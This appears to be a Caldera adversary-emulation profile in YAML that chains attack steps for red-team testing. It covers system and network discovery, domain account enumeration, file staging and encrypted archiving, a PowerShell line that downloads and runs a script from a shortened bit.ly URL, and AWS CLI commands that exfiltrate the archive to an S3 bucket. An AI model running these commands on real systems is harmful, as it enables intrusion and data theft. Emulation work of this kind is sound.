adversary_id: custom_adversary_profile__None__None__stockpile__2023-10-19-22_46_42
name: Custom Adversary Profile
description: None
atomic_ordering:
- 702bfdd2-9947-4eda-b551-c3a1ea9a59a2 # ('702bfdd2-9947-4eda-b551-c3a1ea9a59a2', 'None', 'None') ; {'description': 'System Information Gathering Script', 'tactic': 'collection', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh,pwsh': {'command': 'powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log";'}}}, 'id__dependence__fact': ['702bfdd2-9947-4eda-b551-c3a1ea9a59a2', 'None', 'None'], 'plugin': 'stockpile'}
- 85341c8c-4ecb-4579-8f53-43e3e91d7617 # ('85341c8c-4ecb-4579-8f53-43e3e91d7617', 'None', 'remote.host.ip') ; {'description': 'Locate all active IP and FQDNs on the network', 'tactic': 'discovery', 'technique': {'attack_id': 'T1018', 'name': 'Remote System Discovery'}, 'platforms': {'darwin': {'sh': {'command': 'arp -a', 'parsers': {'plugins.stockpile.app.parsers.ipaddr': [{'source': 'remote.host.ip'}]}}}, 'linux': {'sh': {'command': 'arp -a', 'parsers': {'plugins.stockpile.app.parsers.ipaddr': [{'source': 'remote.host.ip'}]}}}, 'windows': {'psh,cmd': {'command': 'arp -a', 'parsers': {'plugins.stockpile.app.parsers.ipaddr': [{'source': 'remote.host.ip'}]}}}}, 'id__dependence__fact': ['85341c8c-4ecb-4579-8f53-43e3e91d7617', 'None', 'remote.host.ip'], 'plugin': 'stockpile'}
- bfff9006-d1fb-46ce-b173-92cb04e9a031 # ('bfff9006-d1fb-46ce-b173-92cb04e9a031', 'None', 'None') ; {'description': 'Download', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh': {'command': 'powershell.exe -c IEX (New-Object Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}}, 'id__dependence__fact': ['bfff9006-d1fb-46ce-b173-92cb04e9a031', 'None', 'None'], 'plugin': 'stockpile'}
- c7ec57cd-933e-42b6-99a4-e852a9e57a33 # ('c7ec57cd-933e-42b6-99a4-e852a9e57a33', 'None', 'None') ; {'description': 'The net utility is executed via cmd to enumerate domain user accounts.', 'tactic': 'discovery', 'technique': {'attack_id': 'T1087.002', 'name': 'Account Discovery: Domain Account'}, 'platforms': {'windows': {'cmd': {'command': 'net user /domain'}}}, 'id__dependence__fact': ['c7ec57cd-933e-42b6-99a4-e852a9e57a33', 'None', 'None'], 'plugin': 'stockpile'}
- 10fad81e-3f68-47be-83b6-fbee7711c6a9 # ('10fad81e-3f68-47be-83b6-fbee7711c6a9', 'None', 'host.dir.staged') ; {'description': "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", 'tactic': 'collection', 'technique': 'T1119', 'platforms': 'windows', 'id__dependence__fact': ['10fad81e-3f68-47be-83b6-fbee7711c6a9', 'None', 'host.dir.staged'], 'plugin': 'stockpile'}
- 30a8cf10-73dc-497c-8261-a64cc9e91505 # ('30a8cf10-73dc-497c-8261-a64cc9e91505', 'host.dir.staged', 'host.dir.compress') ; {'description': 'This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux', 'tactic': 'collection', 'technique': {'attack_id': 'T1560.001', 'name': 'Archive Collected Data: Archive via Utility'}, 'platforms': {'linux': {'sh': {'command': 'tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n', 'cleanup': 'rm #{host.dir.staged}.tar.gz.gpg\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}, 'windows': {'psh': {'command': '& "C:\\Program Files\\7-Zip\\7z.exe" a "#{host.dir.staged}.7z" "#{host.dir.staged}\\*" "-p#{host.archive.password}" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n', 'cleanup': 'rm #{host.dir.staged}.7z\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}}, 'id__dependence__fact': ['30a8cf10-73dc-497c-8261-a64cc9e91505', 'host.dir.staged', 'host.dir.compress'], 'plugin': 'stockpile'}
- e7bf5dc7-62e4-48b2-acf8-abaf8734c19c # ('e7bf5dc7-62e4-48b2-acf8-abaf8734c19c', 'host.dir.compress', 'None') ; {'description': 'Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1567.002', 'name': 'Exfiltration to Cloud Storage'}, 'platforms': {'linux': {'sh': {'command': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="exfil-#{paw}-$(basename $LocalFile)";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n', 'cleanup': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="exfil-#{paw}-$(basename $LocalFile)";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n'}}, 'windows': {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "exfil-#{paw}-$($SourceFile.name)";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n', 'cleanup': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "exfil-#{paw}-$($SourceFile.name)";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n'}}}, 'id__dependence__fact': ['e7bf5dc7-62e4-48b2-acf8-abaf8734c19c', 'host.dir.compress', 'None'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []